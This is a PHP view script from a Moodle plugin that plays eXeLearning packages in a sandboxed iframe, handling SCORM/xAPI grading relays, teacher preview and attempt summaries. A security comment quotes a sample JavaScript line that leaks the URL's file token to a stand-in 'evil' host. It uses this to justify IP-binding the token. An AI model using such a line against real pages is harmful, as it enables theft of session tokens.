<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * mod_exelearning activity view.
 *
 * Renders the extracted eXeLearning v4 package inside an iframe pointing to the
 * `index.html` served via `pluginfile.php`, preserving the package's native
 * sidebar (technique inherited from mod_exeweb, AN-001).
 *
 * @package    mod_exelearning
 * @copyright  2026 ATE (Área de Tecnología Educativa)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

require(__DIR__ . '/../../config.php');
require_once($CFG->dirroot . '/mod/exelearning/lib.php');
require_once($CFG->libdir . '/completionlib.php');

$id = required_param('id', PARAM_INT);  // Course module id.
$mode = optional_param('mode', 'grading', PARAM_ALPHA); // Grading | preview.

$cm = get_coursemodule_from_id('exelearning', $id, 0, false, MUST_EXIST);
$course = $DB->get_record('course', ['id' => $cm->course], '*', MUST_EXIST);
$exelearning = $DB->get_record('exelearning', ['id' => $cm->instance], '*', MUST_EXIST);

require_course_login($course, true, $cm);
$context = context_module::instance($cm->id);
require_capability('mod/exelearning:view', $context);

// Preview/test mode is ONLY for users with management capability (DEC-0006).
// A student without permission who changes the URL to ?mode=preview falls back to grading.
$canpreview = has_capability('moodle/course:manageactivities', $context);
if ($mode === 'preview' && !$canpreview) {
    $mode = 'grading';
}
if (!in_array($mode, ['grading', 'preview'], true)) {
    $mode = 'grading';
}

// Whether to show the teacher preview/grading toggle banner (DEC-0006). Shown to
// anyone who can manage the activity; capability still gates the preview mode
// itself, so a student can never reach preview regardless.
$showpreviewtoggle = $canpreview;

exelearning_view($exelearning, $course, $cm, $context);

$pageurlparams = ['id' => $cm->id];
if ($mode !== 'grading') {
    $pageurlparams['mode'] = $mode;
}
$PAGE->set_url('/mod/exelearning/view.php', $pageurlparams);
$PAGE->set_title(format_string($exelearning->name));
$PAGE->set_heading(format_string($course->fullname));
$PAGE->set_context($context);

// Initialise the embedded editor AMD only when the "Edit" button is going to be
// shown (manager + editor installed). The listener responds to clicks on
// [data-action="mod_exelearning/editor-open"].
$showeditorbutton = $canpreview && exelearning_embedded_editor_enabled();
if ($showeditorbutton) {
    $PAGE->requires->js_call_amd('mod_exelearning/editor_modal', 'init', []);
}

$fs = get_file_storage();
$mainfile = $fs->get_file(
    $context->id,
    'mod_exelearning',
    'content',
    (int) $exelearning->revision,
    '/',
    'index.html'
);

// Self-heal for programmatic uploads (e.g. the Moodle Playground `addModule`):
// if the ELPX is in the 'package' filearea but the content was not extracted or
// the grade items were not detected (because that path bypassed
// exelearning_add_instance), recover here. Idempotent: only acts when something
// is missing, so it does not penalise the normal view.
$haspackage = (exelearning_get_stored_package($context->id) !== null);
if ($haspackage) {
    if (!$mainfile) {
        exelearning_extract_stored_package($context->id, (int) $exelearning->revision);
        $mainfile = $fs->get_file(
            $context->id,
            'mod_exelearning',
            'content',
            (int) $exelearning->revision,
            '/',
            'index.html'
        );
    }
    // Self-heal the secure-mode bridge client (DEC-0060) into packages extracted
    // before it existed: if index.html is present but libs/exe_scorm_bridge.js is not,
    // re-extract once so the bridge scripts are copied and injected. Idempotent and
    // bounded (only fires until the file exists).
    if ($mainfile) {
        $hasbridge = $fs->get_file(
            $context->id,
            'mod_exelearning',
            'content',
            (int) $exelearning->revision,
            '/libs/',
            'exe_scorm_bridge.js'
        );
        if (!$hasbridge) {
            exelearning_extract_stored_package($context->id, (int) $exelearning->revision);
        }
    }
    // Self-heal grade-item detection, but only when this package revision has
    // not been scanned yet (gradesyncrev marker). This used to fire whenever the
    // activity had no gradable grade item, which for a content-only package
    // (0 gradable iDevices) is PERMANENTLY true and re-extracted + re-parsed the
    // entire ELPX on every single view — a self-inflicted DoS on the most common
    // package type. exelearning_sync_grade_items() stamps max(revision, 1) once
    // it has scanned, so each revision is scanned at most once;
    // exelearning_update_instance() bumps revision to re-arm a scan when the
    // content changes.
    $synctarget = max((int) $exelearning->revision, 1);
    if ((int) $exelearning->gradesyncrev < $synctarget) {
        exelearning_sync_grade_items($exelearning->id, $context->id);
    }
}

echo $OUTPUT->header();
echo $OUTPUT->heading(format_string($exelearning->name));

if (!empty($exelearning->intro)) {
    echo $OUTPUT->box(
        format_module_intro('exelearning', $exelearning, $cm->id),
        'generalbox',
        'intro'
    );
}

// Preview mode banner + toggle links (DEC-0006).
if ($showpreviewtoggle) {
    if ($mode === 'preview') {
        $exiturl = new moodle_url('/mod/exelearning/view.php', ['id' => $cm->id]);
        echo html_writer::start_div('alert alert-warning d-flex justify-content-between align-items-center mb-3');
        echo html_writer::tag(
            'div',
            html_writer::tag('strong', get_string('previewmode', 'mod_exelearning')) . ' ' .
            get_string('previewmode_desc', 'mod_exelearning')
        );
        echo html_writer::link(
            $exiturl->out(false),
            get_string('previewmode_exit', 'mod_exelearning'),
            ['class' => 'btn btn-sm btn-outline-secondary']
        );
        echo html_writer::end_div();
    } else {
        $previewurl = new moodle_url(
            '/mod/exelearning/view.php',
            ['id' => $cm->id, 'mode' => 'preview']
        );
        echo html_writer::div(
            html_writer::link(
                $previewurl->out(false),
                get_string('previewmode_enter', 'mod_exelearning'),
                ['class' => 'btn btn-sm btn-outline-secondary']
            ),
            'mb-3'
        );
    }
}

// Edit with eXeLearning button: opens the embedded editor in an overlay/modal
// (managed by amd/src/editor_modal.js). Only for managers when an editor is
// installed. The data-* attributes must match EXACTLY what editor_modal.js::init()/open()
// reads.
if ($showeditorbutton) {
    $editorurl = new moodle_url(
        '/mod/exelearning/editor/index.php',
        ['id' => $cm->id, 'sesskey' => sesskey()]
    );
    $editorsaveurl = new moodle_url('/mod/exelearning/editor/save.php');
    $editorpackageurl = exelearning_get_package_url($exelearning, $context);
    echo html_writer::div(
        html_writer::tag(
            'button',
            '<i class="fa fa-pencil mr-1" aria-hidden="true"></i> '
                    . get_string('editwitheditor', 'mod_exelearning'),
            [
                        'type' => 'button',
                        'class' => 'btn btn-sm btn-primary',
                        'data-action' => 'mod_exelearning/editor-open',
                        'data-cmid' => $cm->id,
                        'data-editorurl' => $editorurl->out(false),
                        'data-packageurl' => $editorpackageurl ? $editorpackageurl->out(false) : '',
                        'data-saveurl' => $editorsaveurl->out(false),
                        'data-sesskey' => sesskey(),
                        'data-activityname' => format_string($exelearning->name),
                ]
        ),
        // Right-aligned per issue #13 #6.
        'd-flex justify-content-end mb-3'
    );
}

if (!$mainfile) {
    // Create-from-scratch (issue #13 #1, DEC-0024): an activity may be created
    // with no uploaded package. Rather than erroring, guide the teacher to author
    // it in place with the embedded editor (the "Edit with eXeLearning" button is
    // already rendered above when available). Only fall back to the hard error for
    // students, who should never reach an unauthored activity.
    if ($showeditorbutton) {
        echo $OUTPUT->notification(
            get_string('nocontentyet', 'mod_exelearning'),
            \core\output\notification::NOTIFY_INFO
        );
    } else if ($canpreview) {
        echo $OUTPUT->notification(
            get_string('nocontentyetupload', 'mod_exelearning'),
            \core\output\notification::NOTIFY_WARNING
        );
    } else {
        echo $OUTPUT->notification(
            get_string('packagenotfound', 'mod_exelearning'),
            \core\output\notification::NOTIFY_ERROR
        );
    }
} else {
    // Resolve the iframe security mode once (DEC-0060, corrects DEC-0059's Route A).
    // Secure mode serves the package through tokenpluginfile.php so the opaque-origin
    // iframe's subresources (CSS/JS/images) carry a per-user file token in the URL and
    // load WITHOUT the SameSite session cookie (an opaque document never sends it).
    // Secure mode is NOT silently downgraded to legacy: if it cannot render (e.g.
    // slasharguments off, or a service-worker host that cannot serve an opaque iframe)
    // the in-iframe shim never signals ready and the parent relay shows a
    // "blocked by security configuration" notice (client-side watchdog), so an admin
    // fixes it rather than the activity quietly running in the weaker same-origin mode.
    $iframemode = \mod_exelearning\local\ui\player_iframe::resolve_mode();
    $securemode = ($iframemode === \mod_exelearning\local\ui\player_iframe::MODE_SECURE);
    if ($securemode) {
        // Short-lived core_files key, rounded to the hour so it is reused (not
        // regenerated per request). It only authorises file reads and
        // exelearning_pluginfile() still enforces mod/exelearning:view, so the token
        // grants strictly less than the same-origin sesskey it replaces.
        //
        // The token rides in the URL path, so untrusted author JS in the opaque iframe can
        // read it (a document can always read its own location) and the document CSP allows
        // img/media/frame over https:, i.e. it CAN be exfiltrated to a third-party host (e.g.
        // new Image().src='https://evil/?'+location.pathname). Bind the key to the viewer's IP
        // so an exfiltrated token is useless when replayed from the attacker's server (the
        // legitimate file fetches come from the same browser, hence the same IP). Audit M-2.
        $filetoken = get_user_key(
            'core_files',
            $USER->id,
            null,
            getremoteaddr(),
            (intdiv(time(), HOURSECS) + 2) * HOURSECS
        );
        $iframeurl = new moodle_url(
            '/tokenpluginfile.php/' . $filetoken . '/' . $context->id .
            '/mod_exelearning/content/' . (int) $exelearning->revision . '/index.html'
        );
    } else {
        $iframeurl = moodle_url::make_pluginfile_url(
            $context->id,
            'mod_exelearning',
            'content',
            (int) $exelearning->revision,
            '/',
            'index.html'
        );
    }
    // Make the in-package teacher-layer selector available via the package's own URL
    // parameter (eXeLearning core hides teacher content by default and exposes a
    // selector to show it with ?exe-teacher=1; see upstream exelearning#1772). It works
    // in secure mode too: the parameter rides in the iframe src and the package reads
    // its own location.search even under the opaque origin, so no host CSS injection is
    // needed. This replaces the former CSS injection that hid the selector (mod_exeweb
    // parity): the plugin no longer mutates the package. The per-activity
    // teachermodevisible setting alone controls it — when on, the selector is offered to
    // every viewer; no role gate.
    if (!empty($exelearning->teachermodevisible)) {
        $iframeurl->param('exe-teacher', '1');
    }
    // Deep-link from the gradebook (issue #13 #4, DEC-0023): grade.php maps a
    // clicked grade item's itemnumber to its iDevice objectid and forwards it
    // here. Exported iDevices render as <article id="<odeIdeviceId>">, so a URL
    // fragment scrolls straight to the activity natively on single-page packages
    // (multi-page packages land on the front page — best effort).
    $ideviceid = optional_param('idevice', '', PARAM_RAW_TRIMMED);
    if ($ideviceid !== '' && preg_match('/^[A-Za-z0-9_-]+$/', $ideviceid)) {
        $iframeurl->set_anchor($ideviceid);
    }
    // List of detected grade items (for quick feedback to the teacher).
    $items = $DB->get_records(
        'exelearning_grade_item',
        ['exelearningid' => $exelearning->id, 'deleted' => 0],
        'itemnumber ASC'
    );
    if ($exelearning->gradeenabled && has_capability('mod/exelearning:viewreport', $context) && !empty($items)) {
        echo html_writer::start_div('alert alert-info mb-3');
        echo html_writer::tag('strong', get_string('detecteditems', 'mod_exelearning')) . ' ';
        $labels = [];
        foreach ($items as $it) {
            $labels[] = '#' . $it->itemnumber . ' ' . s($it->idevicetype);
        }
        echo s(implode(' · ', $labels));
        echo html_writer::end_div();
    }
    // Participation summary + report link (DEC-0011 option B, Assignment-style):
    // an at-a-glance "how many have attempted" for the teacher without opening
    // the report. Respects separate groups. Skipped when the activity is not graded (DEC-0029).
    if ($exelearning->gradeenabled && has_capability('mod/exelearning:viewreport', $context)) {
        // Users visible to this teacher (respects separate groups).
        $currentgroup = groups_get_activity_group($cm, true);
        $enrolled = get_enrolled_users(
            $context,
            'mod/exelearning:savetrack',
            (int) $currentgroup,
            'u.id'
        );
        $userids = array_keys($enrolled);
        $summary = \mod_exelearning\local\attempts::participation_summary(
            $exelearning->id,
            $userids,
            (int) ($exelearning->grademethod ?? \mod_exelearning\local\attempts::GRADE_HIGHEST)
        );

        $reporturl = new moodle_url('/mod/exelearning/report.php', ['id' => $cm->id]);
        echo html_writer::start_div('alert alert-info d-flex justify-content-between align-items-center mb-3');
        if ($summary['meanpercent'] === null) {
            $text = get_string(
                'participation_summary',
                'mod_exelearning',
                (object) ['attempted' => $summary['attempted'], 'total' => $summary['total']]
            );
        } else {
            $text = get_string(
                'participation_summary_mean',
                'mod_exelearning',
                (object) [
                        'attempted' => $summary['attempted'],
                        'total'     => $summary['total'],
                        'mean'      => format_float($summary['meanpercent'], 1),
                ]
            );
        }
        echo html_writer::tag('span', $text);
        echo html_writer::link(
            $reporturl,
            get_string('viewattemptsreport', 'mod_exelearning'),
            ['class' => 'btn btn-sm btn-outline-primary']
        );
        echo html_writer::end_div();
    }
    // Attempt summary for the student (DEC-0007 phase 2). Skipped when the activity
    // is not graded (DEC-0029).
    if ($exelearning->gradeenabled && !$canpreview) {
        $myattempts = $DB->get_records('exelearning_attempt', [
            'exelearningid' => $exelearning->id,
            'userid'        => $USER->id,
            'itemnumber'    => 0,
        ], 'attempt ASC');
        $used = count($myattempts);
        $maxattempt = (int) ($exelearning->maxattempt ?? 0);
        if ($used > 0 || $maxattempt > 0) {
            $label = ($maxattempt > 0)
                    ? get_string(
                        'attemptsofmax',
                        'mod_exelearning',
                        (object) ['used' => $used, 'max' => $maxattempt]
                    )
                    : get_string('attemptsused', 'mod_exelearning', $used);

            // Enrich with grading method + reported grade (DEC-0011 option C
            // refined: the useful parts of SCORM without its full table).
            $extras = [];
            if ($used > 0) {
                $grademethod = (int) ($exelearning->grademethod
                        ?? \mod_exelearning\local\attempts::GRADE_HIGHEST);
                $methodlabel = get_string(
                    \mod_exelearning\local\attempts::grademethod_stringkey($grademethod),
                    'mod_exelearning'
                );
                $extras[] = get_string('grademethod', 'mod_exelearning') . ': ' . $methodlabel;

                $grademax = (float) ($exelearning->grademax ?? 100);
                $scaled = \mod_exelearning\local\attempts::aggregate_scaled(
                    $exelearning->id,
                    $USER->id,
                    0,
                    $grademethod
                );
                if ($scaled !== null) {
                    $extras[] = get_string('reportedgrade', 'mod_exelearning') . ': '
                            . format_float($scaled * $grademax, 2) . ' / ' . format_float($grademax, 2);
                }
            }
            if ($extras) {
                $label .= ' · ' . implode(' · ', $extras);
            }

            $class = ($maxattempt > 0 && $used >= $maxattempt)
                    ? 'alert alert-warning mb-3' : 'alert alert-secondary mb-3';
            echo html_writer::div($label, $class);
        }
        // Review of previous attempts, according to reviewmode.
        $reviewmode = (int) ($exelearning->reviewmode
                ?? \mod_exelearning\local\attempts::REVIEW_ALWAYS);
        $iscomplete = false;
        $cinfo = new completion_info($course);
        if ($cinfo->is_enabled($cm)) {
            $cdata = $cinfo->get_data($cm, false, $USER->id);
            $iscomplete = in_array(
                (int) $cdata->completionstate,
                [COMPLETION_COMPLETE, COMPLETION_COMPLETE_PASS],
                true
            );
        }
        $canreview = ($reviewmode === \mod_exelearning\local\attempts::REVIEW_ALWAYS)
                || ($reviewmode === \mod_exelearning\local\attempts::REVIEW_AFTERCOMPLETION
                        && $iscomplete);
        if ($canreview && $used > 0) {
            $list = [];
            foreach ($myattempts as $ma) {
                $list[] = get_string('report_attempt', 'mod_exelearning') . ' ' . $ma->attempt
                        . ': ' . format_float((float) $ma->rawscore, 2)
                        . ' / ' . format_float((float) $ma->maxscore, 2);
            }
            echo html_writer::tag(
                'details',
                html_writer::tag('summary', get_string('attempts', 'mod_exelearning'))
                    . html_writer::alist($list),
                ['class' => 'mb-3']
            );
        }
    }
    // SCORM 1.2 client. eXeLearning v4 iDevices use pipwerks SCORM, which calls
    // findAPI() looking for an `API` object with LMSInitialize. How that API is
    // provided depends on the configured iframe security mode (DEC-0059). In secure
    // mode (the default) the package runs in an opaque-origin sandboxed iframe and
    // CANNOT reach this page: window.API lives INSIDE the iframe (baked bridge shim,
    // libs/exe_scorm_bridge.js) and scoring is relayed here over a validated postMessage
    // channel, with this parent only forwarding it to track.php so the sesskey stays on
    // the trusted side. In legacy mode the package is same-origin, window.API is injected
    // here in the parent, and the iframe's pipwerks walks window.parent to find it.
    // One page-load token groups all of this view's commits into a single attempt,
    // shared by whichever channel grades (DEC-0007).
    $sessiontoken = random_string(20);
    // Channel choice (DEC-0064, extended to secure mode by DEC-0069): a package that
    // bundles the upstream xAPI emitter is graded via xAPI in BOTH iframe modes; the SCORM
    // shim stays alive (so pipwerks finds window.API and the iDevices run and emit their
    // statements) but inert, so the two channels never double-count. In legacy mode the
    // SCORM tracker runs in this parent with disableTracking and the xAPI listener trusts a
    // statement by event.origin === host origin (same-origin). In secure mode the package
    // is opaque (event.origin is "null"), so the bridge relay drops the SCORM POST and the
    // xAPI listener trusts a statement by window identity (event.source === the iframe),
    // mirroring the SCORM bridge relay.
    // A legacy package without the emitter keeps SCORM grading exactly as before. The
    // site-wide master switch (exelearning_xapi_primary_enabled) forces every package back
    // onto SCORM without a code change.
    $emitsxapi = exelearning_xapi_primary_enabled()
            && exelearning_package_emits_xapi($context->id, (int) $exelearning->revision);
    // Tracker config (cmid, track URL, per-page attempt token, sesskey). Built by
    // tracking_endpoint, which keeps the session key out of the endpoint URL and in the
    // POST body (SEC-04); both clients below consume the same array, and track.php
    // validates it with require_body_sesskey().
    $scormcfg = \mod_exelearning\local\tracking_endpoint::scorm_config(
        (int) $cm->id,
        $mode,
        $sessiontoken,
        // Inert SCORM shim for xAPI-primary packages (DEC-0064): window.API stays alive
        // so the iDevices run and emit statements, but no score is ever POSTed.
        $emitsxapi
    );

    // Emit an inline <script> that loads a bundled js/ module and boots it. Centralises
    // the HTML-hardening JSON flags, the js/ path and the "\n(function () { ... })();"
    // boot wrapper shared by the SCORM and embed clients below (so a fourth client, or a
    // change to the hardening flags, has a single home). %s in $boot is replaced by the
    // encoded config. Injected inline so each listener is installed before the iframe
    // loads — an async AMD load would race the SCO/embeds.
    $emitinlinemodule = function (string $jsfile, array $cfg, string $boot): void {
        $json = json_encode($cfg, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
        $js = file_get_contents(__DIR__ . '/js/' . $jsfile);
        echo html_writer::tag('script', $js . "\n(function () { " . sprintf($boot, $json) . " })();");
    };

    // Both $iframemode and $securemode were resolved above so the SCORM client, the
    // sandbox tokens and the content URL all agree.
    if ($securemode) {
        // Parent-side bridge relay (js/scorm_bridge_relay.js, also unit-tested with
        // Vitest). Injected inline so its message listener is installed before the
        // iframe loads and emits its first message. It validates each message by
        // window identity (event.source === iframe.contentWindow), a closed action
        // list and a per-view nonce, then performs the authenticated track.php POST
        // (and a sendBeacon flush on pagehide). The nonce and the per-page attempt token
        // are handed to the in-iframe shim during the handshake; the sesskey stays on
        // this trusted side — it reaches track.php in the relay's own POST body and
        // never crosses the bridge. blockedid points at
        // the hidden notice the relay reveals (watchdog) if the iframe never signals
        // ready, i.e. the secure mode could not render here.
        $emitinlinemodule('scorm_bridge_relay.js', $scormcfg + [
            'iframeid' => 'exelearningobject',
            'nonce' => random_string(32),
            'blockedid' => 'exelearning-secure-blocked',
        ], 'window.exeScormBridge.init(%s);');
    } else {
        // Legacy same-origin: host window.API in this parent window. The tracker logic
        // is the single source of truth in js/scorm_tracker.js, also unit-tested with
        // Vitest (tests/js/scorm_tracker.test.js). It is injected inline (not as an AMD
        // module) so window.API is defined synchronously before the package iframe's
        // pipwerks findAPI() runs — an async AMD load would race the SCO and break
        // grading. Config is passed as JSON to the createScormApi() factory instead of
        // string-substituted placeholders.
        // disableTracking makes the shim inert for an xAPI-primary package (DEC-0064):
        // window.API still answers pipwerks so the iDevices run and emit statements, but
        // it never POSTs to track.php, leaving xAPI as the sole grade channel. The secure
        // bridge relay above is made inert the same way (DEC-0069); see $emitsxapi.
        $emitinlinemodule(
            'scorm_tracker.js',
            $scormcfg,
            'window.API = window.exeScormTracker.createScormApi(%s).api;'
        );
    }

    // Parent-side external-media host: ONE vendored artifact
    // (js/exe_external_media/exe-external-media-host.min.js), built and published by
    // eXeLearning core, replacing the three files this used to inline separately -- the
    // embed relay, the media policy and the media host.
    //
    // eXeLearning core is canonical (eXe ADR-0021). This plugin holds the BYTES and
    // verifies them against the shipped manifest rather than holding a copy of the logic
    // that could drift. Do NOT patch it here: a local edit is invisible upstream, is
    // overwritten on the next re-vendor, and fails `node js/exe_external_media/verify.mjs`
    // in CI in the meantime. Fix it in eXeLearning core and re-vendor.
    //
    // In secure mode every package is opaque, so whitelisted video iframes and PDFs are
    // promoted to this page and overlaid inline as real players (the child runtime baked
    // into the package reports their geometry), and the interactive-video iDevice drives
    // playback through the media half of the same bundle (DEC-0071) -- which controls the
    // provider by RAW postMessage, so this trusted page still never loads the YouTube
    // IFrame API or the Vimeo SDK. Inlined like the SCORM relay so both listeners are
    // installed before the iframe loads. No-op in legacy mode (same-origin: external
    // players already work inline and the in-iframe child stays dormant).
    if ($securemode) {
        // The host only consults the whitelist in 'strict' mode; in the default 'open'
        // mode any cross-origin https iframe is promoted, so don't build/ship it.
        $embedmode = \mod_exelearning\local\ui\player_iframe::embed_mode();
        $embedstrict = ($embedmode === \mod_exelearning\local\ui\player_iframe::EMBED_STRICT);
        $externalmedia = file_get_contents(__DIR__ . '/js/exe_external_media/exe-external-media-host.min.js');
        $embedcfg = json_encode([
            'mode' => $embedmode,
            'whitelist' => $embedstrict ? \mod_exelearning\local\ui\player_iframe::embed_whitelist() : [],
        ], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
        echo html_writer::tag(
            'script',
            $externalmedia . "\n(function () {\n" .
            "    window.exeEmbedRelay.init(" . $embedcfg . ");\n" .
            // This script is emitted BEFORE the player iframe so the relay's listeners are
            // installed in time, which means the element does not exist yet: looking it up
            // here found null, the guard below swallowed it, and the media host was never
            // attached on any page. The symptom was silent and a long way from the cause —
            // an interactive-video iDevice inside the sandbox asked for a video, no host
            // answered, and the learner got a blank panel. So the lookup waits for the DOM
            // while the relay above still does not.
            "    var attachmedia = function () {\n" .
            "        var f = document.getElementById('exelearningobject');\n" .
            "        if (f && window.exeMediaHost) { window.exeMediaHost.attach(f, {}); }\n" .
            "    };\n" .
            "    if (document.readyState === 'loading') {\n" .
            "        document.addEventListener('DOMContentLoaded', attachmedia);\n" .
            "    } else {\n" .
            "        attachmedia();\n" .
            "    }\n" .
            "})();"
        );

        // (The media host above is the same bundle; it no longer needs its own injection.)
    }

    // The xAPI listener (DEC-0064; secure mode added by DEC-0069): for an xAPI-capable
    // package, receive the emitter's exe-xapi-statement postMessages in this parent page
    // and forward each to xapi_track.php (the sesskey stays on this trusted side). Same
    // inline single-source-of-truth pattern as the SCORM tracker (js/xapi_listener.js,
    // Vitest-tested). It shares $sessiontoken as the xAPI registration so every statement
    // of this view maps to the same attempt. The trust gate depends on the iframe mode:
    // legacy is same-origin so a statement is trusted by event.origin === host origin;
    // secure is opaque (event.origin is "null"), so it is trusted by window identity
    // (event.source === the iframe), exactly like the SCORM bridge relay above.
    if ($emitsxapi) {
        $hostorigin = preg_replace('~^(https?://[^/]+).*~', '$1', $CFG->wwwroot);
        // Same endpoint builder as the SCORM tracker: routing params in the URL, the
        // session key in the POST body (SEC-04), validated by require_body_sesskey().
        $xapicfg = \mod_exelearning\local\tracking_endpoint::xapi_config(
            (int) $cm->id,
            $mode,
            $sessiontoken,
            $hostorigin
        );
        if ($securemode) {
            // The package runs in an opaque origin, so event.origin is "null" and can
            // never match the host origin: anchor the trust gate on window identity
            // instead, exactly like the SCORM bridge relay.
            $xapicfg['iframeid'] = 'exelearningobject';
            unset($xapicfg['allowedOrigin']);
        }
        $emitinlinemodule('xapi_listener.js', $xapicfg, 'window.exeXapiListener.createListener(%s).start();');
    }

    // Fullscreen control (issue #13 #6, DEC-0024): a right-aligned button above the
    // player. The iframe already advertises allow="fullscreen"; amd/src/fullscreen.js
    // drives the Fullscreen API on it (and falls back to vendor-prefixed methods).
    echo html_writer::div(
        html_writer::tag(
            'button',
            '<i class="fa fa-expand mr-1" aria-hidden="true"></i> '
                    . get_string('fullscreen', 'mod_exelearning'),
            [
                    'type' => 'button',
                    'class' => 'btn btn-sm btn-outline-secondary',
                    'id' => 'exelearning-fullscreen-toggle',
                    'data-target' => 'exelearningobject',
                    'aria-pressed' => 'false',
            ]
        ),
        'exelearning-toolbar d-flex justify-content-end mb-2'
    );
    $PAGE->requires->js_call_amd('mod_exelearning/fullscreen', 'init', ['exelearningobject']);

    // Hidden notice the relay's watchdog reveals if the secure-mode iframe never
    // signals ready (e.g. an environment that cannot serve an opaque-origin iframe,
    // such as a PHP-WASM service-worker host). Secure mode is never silently
    // downgraded to the weaker same-origin mode (DEC-0060).
    if ($securemode) {
        echo html_writer::div(
            get_string('securemodeblocked', 'mod_exelearning'),
            'alert alert-warning',
            ['id' => 'exelearning-secure-blocked', 'role' => 'alert', 'style' => 'display:none;']
        );
    }

    // Package iframe. The sandbox token list depends on the configured iframe
    // security mode (\mod_exelearning\local\ui\player_iframe, DEC-0059). Both modes
    // omit allow-top-navigation (a package must not change the parent URL) and
    // allow-modals; secure mode also omits allow-same-origin (opaque origin, so the
    // package cannot reach this page) and allow-popups-to-escape-sandbox.
    echo html_writer::tag('iframe', '', [
        'src'    => $iframeurl->out(false),
        'name'   => 'exelearningobject',
        'id'     => 'exelearningobject',
        'title'  => format_string($exelearning->name),
        'width'  => '100%',
        'height' => '650',
        'allow'  => 'fullscreen',
        'sandbox' => \mod_exelearning\local\ui\player_iframe::sandbox_tokens(),
        'style'  => 'border: 1px solid var(--bs-border-color, #dee2e6); border-radius: .5rem;',
    ]);

    // Teacher-only content is hidden by default inside the eXeLearning package and
    // revealed via the ?exe-teacher=1 URL parameter appended to the iframe src above
    // when the teachermodevisible setting is on (legacy and secure mode alike). The
    // plugin no longer injects CSS into the package to hide the teacher-layer selector
    // (mod_exeweb parity retired), and the SCORM bridge no longer carries the flag.
}

echo $OUTPUT->footer();
